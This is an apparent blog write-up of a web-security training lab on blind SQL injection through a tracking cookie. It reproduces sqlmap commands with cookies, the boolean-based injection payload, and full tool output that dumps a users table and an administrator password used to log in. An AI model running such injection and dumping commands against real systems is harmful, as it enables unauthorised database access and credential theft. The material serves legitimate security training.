---
layout: post
title:  "Blind SQL injection with conditional responses"
date:   2024-09-22 09:39:54 +0530
---

## Objective 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## Solution 

When I put `'` into all the sensitive areas like cookie, param value and Interrstingly, the trackingId value is vulnerable to Blind SQL injection 

Because when u don't add `'` into `trackingId` you will see a string called `Welcome back` 

![]({{ site.baseurl }}/assets/images/sqli47.png)

But when you add `'` and `Welcome back` string disappears 

![]({{ site.baseurl }}/assets/images/sqli48.png)

With `SQLmap` we can automate further and here we found this application is vulnerable to a SQL injection and it uses `PostgreSQL` 

```sh
$ sqlmap -u "https://0aba00e704a0e247d90aa592003b00b9.web-security-academy.net/filter?category=Pets" --cookie "TrackingId=4HWFjkvkQS0pdMwd; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i" --level 3 

[11:05:47] [INFO] Cookie parameter 'TrackingId' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Welcome back!")
[11:05:47] [INFO] testing 'Generic inline queries'
[11:05:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:05:48] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[11:05:48] [INFO] testing 'PostgreSQL inline queries'
[11:05:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:05:49] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[11:05:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[11:05:55] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[11:05:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:05:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:05:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:05:58] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[11:06:19] [INFO] target URL appears to be UNION injectable with 1 columns
[11:06:21] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[11:06:31] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[11:06:40] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[11:06:49] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[11:06:59] [INFO] checking if the injection point on Cookie parameter 'TrackingId' is a false positive
Cookie parameter 'TrackingId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 480 HTTP(s) requests:
---
Parameter: TrackingId (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: TrackingId=4HWFjkvkQS0pdMwd' AND 9875=9875-- jCQf; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i
---
[11:07:12] [INFO] testing PostgreSQL
[11:07:12] [INFO] confirming PostgreSQL
[11:07:13] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[11:07:24] [INFO] fetched data logged to text files under '/Users/nits/.local/share/sqlmap/output/0aba00e704a0e247d90aa592003b00b9.web-security-academy.net'

[*] ending @ 11:07:24 /2024-09-22/
```

Dumping the database and found the `administrator` credentials being dumped out 

```sh
 nits@FWS-CHE-LT-8869  /tmp  sqlmap -u "https://0aba00e704a0e247d90aa592003b00b9.web-security-academy.net/filter?category=Pets" --cookie "TrackingId=4HWFjkvkQS0pdMwd; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i" --level 3 --dbms="postgreSQL" --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:08:20 /2024-09-22/

[11:08:21] [INFO] testing connection to the target URL
[11:08:22] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: TrackingId (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: TrackingId=4HWFjkvkQS0pdMwd' AND 9875=9875-- jCQf; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i
---
[11:08:22] [INFO] testing PostgreSQL
[11:08:22] [INFO] confirming PostgreSQL
[11:08:22] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[11:08:22] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:08:22] [INFO] fetching current database
[11:08:22] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:08:22] [INFO] retrieved: 
do you want to URL encode cookie values (implementation specific)? [Y/n] n
public
[11:08:51] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
[11:08:51] [INFO] fetching tables for database: 'public'
[11:08:51] [INFO] fetching number of tables for database 'public'
[11:08:51] [INFO] retrieved: 2
[11:08:55] [INFO] retrieved: tracking
[11:09:30] [INFO] retrieved: users
[11:09:53] [INFO] fetching columns for table 'tracking' in database 'public'
[11:09:53] [INFO] retrieved: 1
[11:09:56] [INFO] retrieved: id
[11:10:11] [INFO] fetching entries for table 'tracking' in database 'public'
[11:10:11] [INFO] fetching number of entries for table 'tracking' in database 'public'
[11:10:11] [INFO] retrieved: 1
[11:10:14] [INFO] retrieved: 4HWFjkvkQS0pdMwd
Database: public
Table: tracking
[1 entry]
+------------------+
| id               |
+------------------+
| 4HWFjkvkQS0pdMwd |
+------------------+

[11:11:38] [INFO] table 'public.tracking' dumped to CSV file '/Users/nits/.local/share/sqlmap/output/0aba00e704a0e247d90aa592003b00b9.web-security-academy.net/dump/public/tracking.csv'
[11:11:38] [INFO] fetching columns for table 'users' in database 'public'
[11:11:38] [INFO] retrieved: 3
[11:11:41] [INFO] retrieved: email
[11:11:58] [INFO] retrieved: password
[11:12:32] [INFO] retrieved: username
[11:13:02] [INFO] fetching entries for table 'users' in database 'public'
[11:13:02] [INFO] fetching number of entries for table 'users' in database 'public'
[11:13:02] [INFO] retrieved: 3
[11:13:06] [INFO] retrieved:  
[11:13:11] [INFO] retrieved: 5hfnoaj3hayybellcxwy
[11:14:22] [INFO] retrieved: administrator
[11:15:15] [INFO] retrieved:  
[11:15:20] [INFO] retrieved: 
```

With those credentials logged in as `administrator` and lab is solved 

![]({{ site.baseurl }}/assets/images/sqli49.png)